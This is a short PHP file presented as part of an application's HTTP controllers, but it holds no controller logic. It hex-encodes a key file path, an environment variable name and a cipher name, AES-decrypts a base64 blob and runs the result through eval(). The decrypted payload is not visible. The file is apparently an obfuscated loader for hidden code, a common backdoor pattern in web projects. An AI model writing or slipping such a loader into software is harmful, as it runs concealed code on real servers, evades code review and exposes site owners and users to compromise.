<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Htz0ICyY7xSWJ/h5nZgqcw==');

$c=base64_decode(

'yf+KwgEi46rpmgMNHnF9hkHdQOZj2IzEJU3SxpOiLpJ7Fd+4aEyLJsjbNdbf8I3/dTfXMm218tl+' .
'lY4jcgqR4KYYRuaUxFEqQd04Cxwamt3MN/7CkRfjuHkSZcNM8u2EM3RafM1GDGgFmh1qo0CSwt0d' .
'mBT332DTjjoVD25DL12LMA1FHIeNFSt5JIgKeoX20azOadJ7hJe1e+Oukaiphil+xM2SzemMSeoG' .
'j6mKMcm1oqIjBl4z3DFk+KMmBFNp'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

